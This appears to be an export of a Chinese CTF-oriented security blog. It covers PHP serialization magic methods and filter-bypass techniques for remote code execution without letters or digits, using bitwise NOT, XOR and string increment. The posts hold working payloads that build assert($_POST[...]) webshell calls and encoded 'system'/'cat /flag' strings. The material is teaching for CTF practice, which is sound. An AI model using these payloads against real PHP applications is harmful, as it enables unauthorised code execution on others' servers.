 </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__destruct&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__wakeup&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__sleep&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;variable&#x27;</span>,<span class=\"string\">&#x27;variable2&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">//创建一个对象，回调用__construct</span></span><br><span class=\"line\"><span class=\"variable\">$object</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"comment\">//序列化一个对象，会调用__sleep</span></span><br><span class=\"line\"><span class=\"variable\">$serialized</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$object</span>);</span><br><span class=\"line\"><span class=\"comment\">//输出序列化后的字符串</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">&#x27;Serialized:&#x27;</span>.<span class=\"variable\">$serialized</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">//重建对象，会调用__wakeup</span></span><br><span class=\"line\"><span class=\"variable\">$object2</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serialized</span>);</span><br><span class=\"line\"><span class=\"comment\">//调用printvariable,会输出数据(变量反序列化后都要销毁)</span></span><br><span class=\"line\"><span class=\"variable\">$object2</span>-&gt;<span class=\"title function_ invoke__\">printvariable</span>();</span><br><span class=\"line\"><span class=\"comment\">//脚本结束，会调用__destruct</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__construct</span><br><span class=\"line\">__sleep</span><br><span class=\"line\">Serialized:O:4:&quot;test&quot;:2:&#123;s:8:&quot;variable&quot;;s:33:&quot;变量反序列化后都要销毁&quot;;s:9:&quot;variable2&quot;;s:5:&quot;OTHER&quot;;&#125;</span><br><span class=\"line\">__wakeup</span><br><span class=\"line\">变量反序列化后都要销毁</span><br><span class=\"line\">__destruct</span><br><span class=\"line\">__destruct</span><br></pre></td></tr></table></figure>\n<p>想学习更多关于 php 反序列化漏洞的题目的看这里哦<br>\n<a href=\"https://hq185187.github.io/2023/04/27/unserialize-labs/\">靶场入门</a><br>\n<a href=\"\">进阶刷题</a></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/",
            "url": "https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/",
            "title": "无字母数字rce",
            "date_published": "2023-04-26T15:44:49.152Z",
            "content_html": "<h2 id=\"一取反~\"><a class=\"markdownIt-Anchor\" href=\"#一取反~\">#</a> 一。取反 (~)</h2>\n<ol>\n<li>system () 函数</li>\n</ol>\n<ul>\n<li>执行外部程序并显示输出资料</li>\n</ul>\n<ol start=\"2\">\n<li>eval () 函数</li>\n</ol>\n<ul>\n<li>把字符串当 php 代码执行，必须以；结尾</li>\n</ul>\n<ol start=\"3\">\n<li>php 的取反问题～<br>\n 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～</li>\n</ol>\n<ul>\n<li>对于数字取反的规则可以看看这篇:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>对于字符取反，由于有大量的不可显字符，要 url 编码</li>\n<li>方法一:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行<br>\n eg2.<br>\n 要构造 <code>assert($_POST[1])</code>  语句，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">得到</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(写在一行):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>常见取反 url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n 可自行运行得:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;卢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;卢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// 输出rr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;是\\x8d,\\x8d取反是r</code></p>\n<h1 id=\"二异或\"><a class=\"markdownIt-Anchor\" href=\"#二异或\">#</a> 二。异或</h1>\n<p>引例:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;5&quot;</span>^<span class=\"string\">&quot;Z&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果是 o, 为什么？<br>\n5 的 ASCII 为 53, 二进制为 00110101,Z 的 ASCII 为 90, 二进制是 01011010, 将它们进行异或 (相同为 0, 不同为一)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00110101</span><br><span class=\"line\">01011010</span><br><span class=\"line\">01101111=111=o</span><br></pre></td></tr></table></figure>\n<p>所以，php 中两个字符进行异或操作得到仍然是一个字符，所以我们要是想要 a-z 中个字符时，就可以找到两个非数字字母的字符，只要他们异或的结果是这个字符就行<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMjU0MTA4MC8yMDIxMTAvMjU0MTA4MC0yMDIxMTAxMzIwMTMwOTM1OS0xNDU3NzYwNzkucG5n\"> ASCII 码参考</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">比如构造a</span><br><span class=\"line\">01100001 a</span><br><span class=\"line\">00100001 !</span><br><span class=\"line\">01000000 @</span><br><span class=\"line\">此时!^@就是a</span><br></pre></td></tr></table></figure>\n<p>利用这个方法拼接就完事了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class=\"line\">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br></pre></td></tr></table></figure>\n<p>也可以通关脚本来快速得到异或需要的字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">valid = <span class=\"string\">&quot;1234567890!@$%^*()&#123;&#125;[];\\&#x27;\\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class=\"line\">answer = <span class=\"built_in\">str</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入进行异或构造的字符串：&quot;</span>))</span><br><span class=\"line\">tmp1, tmp2 = <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> answer:</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> valid:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> valid:</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">ord</span>(i) ^ <span class=\"built_in\">ord</span>(j) == <span class=\"built_in\">ord</span>(c)):</span><br><span class=\"line\">        tmp1 += i</span><br><span class=\"line\">        tmp2 += j</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;tmp1为:&quot;</span>,tmp1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;tmp2为:&quot;</span>,tmp2)</span><br></pre></td></tr></table></figure>\n<p>拼接起来:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$_</span>=(<span class=\"string\">&#x27;%40&#x27;</span>^<span class=\"string\">&#x27;%21&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%1E&#x27;</span>).(<span class=\"string\">&#x27;%7E&#x27;</span>^<span class=\"string\">&#x27;%0C&#x27;</span>).(<span class=\"string\">&#x27;%7C&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>);  <span class=\"comment\">// $_=assert</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"string\">&#x27;_&#x27;</span>.(<span class=\"string\">&#x27;%0D&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0F&#x27;</span>^<span class=\"string\">&#x27;%40&#x27;</span>).(<span class=\"string\">&#x27;%0E&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0B&#x27;</span>^<span class=\"string\">&#x27;%5F&#x27;</span>);  <span class=\"comment\">// $__=_POST</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>=<span class=\"variable\">$$__</span>; <span class=\"comment\">//$___=$_POST</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>(<span class=\"variable\">$___</span>[_]);<span class=\"comment\">//assert($_POST[_]);</span></span><br><span class=\"line\">放到一排就是：</span><br><span class=\"line\"><span class=\"variable\">$_</span>=(<span class=\"string\">&#x27;%40&#x27;</span>^<span class=\"string\">&#x27;%21&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%1E&#x27;</span>).(<span class=\"string\">&#x27;%7E&#x27;</span>^<span class=\"string\">&#x27;%0C&#x27;</span>).(<span class=\"string\">&#x27;%7C&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>);<span class=\"variable\">$__</span>=<span class=\"string\">&#x27;_&#x27;</span>.(<span class=\"string\">&#x27;%0D&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0F&#x27;</span>^<span class=\"string\">&#x27;%40&#x27;</span>).(<span class=\"string\">&#x27;%0E&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0B&#x27;</span>^<span class=\"string\">&#x27;%5F&#x27;</span>);<span class=\"variable\">$___</span>=<span class=\"variable\">$$__</span>;<span class=\"variable\">$_</span>(<span class=\"variable\">$___</span>[_]);</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:</span><br><span class=\"line\">_=<span class=\"title function_ invoke__\">phpinfo</span>();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"三自增\"><a class=\"markdownIt-Anchor\" href=\"#三自增\">#</a> 三。自增</h1>\n<p>在处理字符运算时，php 沿袭了 perl 的语法而不是 c 的，规则:<br>\n 从最后一个字符按照 ascii 顺序向上进一位，也就是 A–&gt;Z,a–&gt;z，如果是 Z 或 z 字符，再进一位表示多加一个字符。</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=<span class=\"string\">&quot;b&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">c</span><br><span class=\"line\">$a=<span class=\"string\">&quot;ba&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">bb</span><br><span class=\"line\">$a=<span class=\"string\">&quot;bz&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">ca</span><br><span class=\"line\">$a=<span class=\"string\">&quot;Az&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">Ba</span><br><span class=\"line\">$a=<span class=\"string\">&quot;bZ&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">cA</span><br><span class=\"line\">$a=<span class=\"string\">&quot;zz&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">aaa</span><br></pre></td></tr></table></figure>\n<p><mark>注意</mark></p>\n<ol>\n<li>注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。</li>\n<li>递增或递减其他字符变量则无效，原字符串没有变化。<br>\n这里放两个 payload:</li>\n</ol>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=[].<span class=\"string\">&#x27;&#x27;</span>;   <span class=\"comment\">//得到&quot;Array&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> = <span class=\"variable\">$_</span>[<span class=\"variable\">$__</span>];   <span class=\"comment\">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$___</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span> = <span class=\"variable\">$___</span>;   <span class=\"comment\">//$_=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;AS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSE&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSER&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSERT&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> = <span class=\"string\">&quot;_&quot;</span>;   <span class=\"comment\">//$____=&quot;_&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_P&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_PO&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_POS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_POST&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span> = <span class=\"variable\">$$____</span>;   <span class=\"comment\">//$_=$_POST</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>(<span class=\"variable\">$_</span>[_]);   <span class=\"comment\">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=[];</span><br><span class=\"line\"><span class=\"variable\">$_</span>=@<span class=\"string\">&quot;<span class=\"subst\">$_</span>&quot;</span>; <span class=\"comment\">// $_=&#x27;Array&#x27;;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"variable\">$_</span>[<span class=\"string\">&#x27;!&#x27;</span>==<span class=\"string\">&#x27;@&#x27;</span>]; <span class=\"comment\">// $_=$_[0];</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>=<span class=\"variable\">$_</span>; <span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;</span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>; <span 